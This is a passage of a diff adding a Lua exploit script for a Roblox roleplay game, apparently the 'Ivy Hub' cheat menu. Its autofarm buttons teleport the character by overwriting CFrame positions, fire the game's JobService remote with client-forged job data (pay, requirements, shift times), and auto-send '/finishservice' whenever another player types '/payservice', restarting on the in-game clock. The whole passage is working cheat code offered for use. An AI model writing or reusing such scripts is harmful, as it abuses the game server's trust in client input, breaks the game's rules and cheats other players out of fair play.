+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    
+
+
+    if ReplicatedStorage.Scenes.Interiors:FindFirstChild("Key Resource Employment Office") then
+        ReplicatedStorage.Scenes.Interiors:FindFirstChild("Key Resource Employment Office").Parent = workspace.Interiors
+    end
+    wait(1)
+
+    local Arguments1 = {
+        [1] = "GiveGui"
+        }
+
+    game:GetService("ReplicatedStorage").Events.JobService:FireServer(unpack(Arguments1))
+    
+    wait(1)
+
+    local Arguments2 = {
+         [1] = "Apply",
+         [2] = {
+        ["job_radius"] = 60,
+        ["CanWork"] = true,
+        ["indoor_job_point"] = workspace.JobPoints.Litfits,
+        ["Workers"] = {},
+        ["ID"] = "LitFits",
+        ["job_point"] = workspace.JobPoints.LitfitsInterior,
+        ["MaxPositions"] = 3,
+        ["Data"] = {
+            ["HourReqirement"] = 0,
+            ["EndTime"] = "22:00:00",
+            ["Shiftless"] = false,
+            ["JobDesc"] = "Sell clothes to customers. Very simple.",
+            ["JobTitle"] = "LitFits Clerk",
+            ["RequiredConstantWork"] = true,
+            ["UniformShirt"] = 198707189,
+            ["UniformPants"] = 3127805122,
+            ["Commission"] = 0,
+            ["StartTime"] = "08:00:00",
+            ["BasePay"] = 200,
+            ["JobRules"] = "Make sure customers do not shoplift, and check them out when purchasing clothing. Help the customer find the right size if needed."
+        }
+      }
+    }
+
+    game:GetService("ReplicatedStorage").Events.JobService:FireServer(unpack(Arguments2))
+
+    wait(1)
+
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1999.5096435546875, -244.62509155273438, 24.730424880981445)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1993.15918, -232.800003, 13.1611395, -0.485701829, 0, -0.874124587, 0, 1, 0, 0.874124587, 0, -0.485701829)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1993.15918, -232.800003, 13.1611395, -0.485701829, 0, -0.874124587, 0, 1, 0, 0.874124587, 0, -0.485701829)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    Wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1993.15918, -232.800003, 13.1611395, -0.485701829, 0, -0.874124587, 0, 1, 0, 0.874124587, 0, -0.485701829)
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1999.5096435546875, -244.62509155273438, 24.730424880981445)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1993.15918, -232.800003, 13.1611395, -0.485701829, 0, -0.874124587, 0, 1, 0, 0.874124587, 0, -0.485701829)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1993.15918, -232.800003, 13.1611395, -0.485701829, 0, -0.874124587, 0, 1, 0, 0.874124587, 0, -0.485701829)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    Wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1993.15918, -232.800003, 13.1611395, -0.485701829, 0, -0.874124587, 0, 1, 0, 0.874124587, 0, -0.485701829)
+
+    if ReplicatedStorage.Scenes.Interiors:FindFirstChild("Lit Fits") then
+        ReplicatedStorage.Scenes.Interiors:FindFirstChild("Lit Fits").Parent = workspace.Interiors
+    end
+end
+
+Start()
+
+local function Check()
+    if game:GetService("Lighting").ClockTime == 22 then
+        Start()
+    end
+end
+
+game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(Check)
+
+for _, child in pairs(game.Players:GetChildren()) do
+    child.Chatted:Connect(function(msg)
+        if string.find(msg, "/payservice") then
+            SendMessage("/finishservice")
+        end
+    end)
+end
+
+game.Players.ChildAdded:Connect(function(child)
+    child.Chatted:Connect(function(msg)
+        if string.find(msg, "/payservice") then
+            SendMessage("/finishservice")
+        end
+    end)
+end)
+end)
+
+Section1:CreateButton("LaFancy", function ()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "starting autofarm...", Icon = "rbxassetid://14445651728", Duration = 3,})
+    wait(1)
+    local Player = game.Players.LocalPlayer
+local Character = Player.Character
+local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+
+local function SendMessage(message)
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    local ChatModule = require(game.Players.LocalPlayer.PlayerScripts.ChatScript.ChatMain)
+    ChatModule.MessagePosted:fire(message);
+end
+
+local function Start()
+   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    
+
+
+    if ReplicatedStorage.Scenes.Interiors:FindFirstChild("Key Resource Employment Office") then
+        ReplicatedStorage.Scenes.Interiors:FindFirstChild("Key Resource Employment Office").Parent = workspace.Interiors
+    end
+    wait(1)
+
+    local Arguments1 = {
+        [1] = "GiveGui"
+        }
+
+    game:GetService("ReplicatedStorage").Events.JobService:FireServer(unpack(Arguments1))
+    
+    wait(1)
+
+    local Arguments2 = {
+         [1] = "Apply",
+         [2] = {
+        ["job_radius"] = 60,
+        ["CanWork"] = true,
+        ["indoor_job_point"] = workspace.JobPoints.LaFancy,
+        ["Workers"] = {},
+        ["ID"] = "LaFancy",
+        ["job_point"] = workspace.JobPoints.LaFancyInterior,
+        ["MaxPositions"] = 3,
+        ["Data"] = {
+            ["HourReqirement"] = 0,
+            ["EndTime"] = "18:00:00",
+            ["Shiftless"] = false,
+            ["JobDesc"] = "Sell clothes to customers. Very simple.",
+            ["JobTitle"] = "LaFancy Clerk",
+            ["RequiredConstantWork"] = true,
+            ["UniformShirt"] = 479749640,
+            ["UniformPants"] = 479749688,
+            ["Commission"] = 0,
+            ["StartTime"] = "07:00:00",
+            ["BasePay"] = 225,
+            ["JobRules"] = "Make sure customers do not shoplift, and check them out when purchasing clothing. Help the customer find the right size if needed."
+        }
+      }
+    }
+
+    game:GetService("ReplicatedStorage").Events.JobService:FireServer(unpack(Arguments2))
+
+    wait(1)
+
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    Wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    Wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+
+    if ReplicatedStorage.Scenes.Interiors:FindFirstChild("La Fancy") then
+        ReplicatedStorage.Scenes.Interiors:FindFirstChild("La Fancy").Parent = workspace.Interiors
+    end
+end
+
+Start()
+
+local function Check()
+    if game:GetService("Lighting").ClockTime == 22 then
+        Start()
+    end
+end
+
+game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(Check)
+
+for _, child in pairs(game.Players:GetChildren()) do
+    child.Chatted:Connect(function(msg)
+        if string.find(msg, "/payservice") then
+            SendMessage("/finishservice")
+        end
+    end)
+end
+
+game.Players.ChildAdded:Connect(function(child)
+    child.Chatted:Connect(function(msg)
+        if string.find(msg, "/payservice") then
+            SendMessage("/finishservice")
+        end
+    end)
+end)
+end)
+
+
+Section1:CreateButton("Pawnshop", function ()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "starting autofarm...", Icon = "rbxassetid://14445651728", Duration = 3,})
+    wait(1)
+    local Player = game.Players.LocalPlayer
+local Character = Player.Character
+local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+
+local function SendMessage(message)
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    local ChatModule = require(game.Players.LocalPlayer.PlayerScripts.ChatScript.ChatMain)
+    ChatModule.MessagePosted:fire(message);
+end
+
+local function Start()
+   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    
+
+
+    if ReplicatedStorage.Scenes.Interiors:FindFirstChild("Key Resource Employment Office") then
+        ReplicatedStorage.Scenes.Interiors:FindFirstChild("Key Resource Employment Office").Parent = workspace.Interiors
+    end
+    wait(1)
+
+    local Arguments1 = {
+        [1] = "GiveGui"
+        }
+
+    game:GetService("ReplicatedStorage").Events.JobService:FireServer(unpack(Arguments1))
+    
+    wait(1)
+
+    local Arguments2 = {
+         [1] = "Apply",
+         [2] = {
+        ["job_radius"] = 60,
+        ["CanWork"] = true,
+        ["indoor_job_point"] = workspace.JobPoints.PawnShop,
+        ["Workers"] = {},
+        ["ID"] = "Pawnshop",
+        ["job_point"] = workspace.JobPoints.PawnShopInterior,
+        ["MaxPositions"] = 3,
+        ["Data"] = {
+            ["HourReqirement"] = 0,
+            ["EndTime"] = "20:00:00",
+            ["Shiftless"] = false,
+            ["JobDesc"] = "Sell clothes to customers. Very simple.",
+            ["JobTitle"] = "Pawnshop Clerk",
+            ["RequiredConstantWork"] = true,
+            ["UniformShirt"] = 207402508,
+            ["UniformPants"] = 4693281203,
+            ["Commission"] = 0,
+            ["StartTime"] = "10:00:00",
+            ["BasePay"] = 110,
+            ["JobRules"] = "Ask the customer what they are looking to buy, then pretend go in the back and Roleplay check the inventory. Then return and /finishservice, and they will be given a shop menu. From there whatever they buy you will make 10% of it on commission."
+        }
+      }
+    }
+
+    game:GetService("ReplicatedStorage").Events.JobService:FireServer(unpack(Arguments2))
+
+    wait(1)
+
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-452.953613, 4.06701279, -24.2798595, 0.996192813, 1.70106222e-08, 0.0871769488, -4.81247753e-09, 1, -1.40134134e-07, -0.0871769488, 1.39181083e-07, 0.996192813)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-452.953613, 4.06701279, -24.2798595, 0.996192813, 1.70106222e-08, 0.0871769488, -4.81247753e-09, 1, -1.40134134e-07, -0.0871769488, 1.39181083e-07, 0.996192813)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-452.953613, 4.06701279, -24.2798595, 0.996192813, 1.70106222e-08, 0.0871769488, -4.81247753e-09, 1, -1.40134134e-07, -0.0871769488, 1.39181083e-07, 0.996192813)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    Wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1107.88623, -203.425049, 811.124573, -0.655024111, 0, 0.755607963, 0, 1, 0, -0.755607963, 0, -0.655024111)
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1107.88623, -203.425049, 811.124573, -0.655024111, 0, 0.755607963, 0, 1, 0, -0.755607963, 0, -0.655024111)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1107.88623, -203.425049, 811.124573, -0.655024111, 0, 0.755607963, 0, 1, 0, -0.755607963, 0, -0.655024111)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1107.88623, -203.425049, 811.124573, -0.655024111, 0, 0.755607963, 0, 1, 0, -0.755607963, 0, -0.655024111)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    Wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1107.88623, -203.425049, 811.124573, -0.655024111, 0, 0.755607963, 0, 1, 0, -0.755607963, 0, -0.655024111)
+
+    if ReplicatedStorage.Scenes.Interiors:FindFirstChild("La Fancy") then
+        ReplicatedStorage.Scenes.Interiors:FindFirstChild("La Fancy").Parent = workspace.Interiors
+    end
+end
+
+Start()
+
+local function Check()
+    if game:GetService("Lighting").ClockTime == 22 then
+        Start()
+    end
+end
+
+game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(Check)
+
+for _, child in pairs(game.Players:GetChildren()) do
+    child.Chatted:Connect(function(msg)
+        if string.find(msg, "/payservice") then
+            SendMessage("/finishservice")
+        end
+    end)
+end
+
+game.Players.ChildAdded:Connect(function(child)
+    child.Chatted:Connect(function(msg)
+        if string.find(msg, "/payservice") then
+            SendMessage("/finishservice")
+        end
+    end)
+end)
+end)
+
+local Section2 = Page1:CreateSection("Advance")
+Section2:CreateButton("LitFits and Actor", function ()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "starting autofarm...", Icon = "rbxassetid://14445651728", Duration = 3,})
+    wait(1)
+    local Player = game.Players.LocalPlayer
+    local Character = Player.Character
+    local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+    
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    
+    
+    local function SendMessage(message)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+        local ChatModule = require(game.Players.LocalPlayer.PlayerScripts.ChatScript.ChatMain)
+        ChatModule.MessagePosted:fire(message);
+    end
+    
+    local function Start()
+        SendMessage("/quitjob")
+        wait(2)
+       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
